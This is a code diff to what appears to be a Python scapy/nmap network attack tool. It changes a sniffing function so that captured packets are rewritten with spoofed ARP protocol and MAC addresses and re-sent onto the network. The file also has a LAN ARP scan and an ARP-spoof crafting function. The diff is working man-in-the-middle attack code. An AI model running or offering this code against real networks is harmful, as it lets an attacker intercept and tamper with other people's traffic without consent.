@@ -1,4 +1,4 @@
-import nmap
+import nmap, sys
 from scapy.all import *
 
 # Return IP & Mac of every connected device (Root might be useful be not necessary)
@@ -44,13 +44,20 @@ def arp_scan(target_ip = '192.168.0.0/24'):
 
 def sniffing(src, dst):
     def editPkg(pkg):
-        pkg.src = src
-        pkg.dst = dst
-        print(pkg.show)
-        # send(pkg)
+        pkg.psrc = src
+        pkg.pdst = dst
+        pkg.src = getmacbyip(src)
+        pkg.dst = getmacbyip(dst)
+        # print(pkg.show)
+        pkg.show()
+        sys.stdout.flush()
+        send(pkg)
+    
+    def stop(x):
+        return not getattr(threading.currentThread(), "do_run", True)
 
-    # sniff(prn=editPkg, filter="src " + src)
-    sniff(prn=editPkg)
+    sniff(prn=editPkg, filter="src " + src, stop_filter = stop)
+    # sniff(prn=editPkg)
 
 
 def craft_arp_spoof(target_ip, gateway_ip):
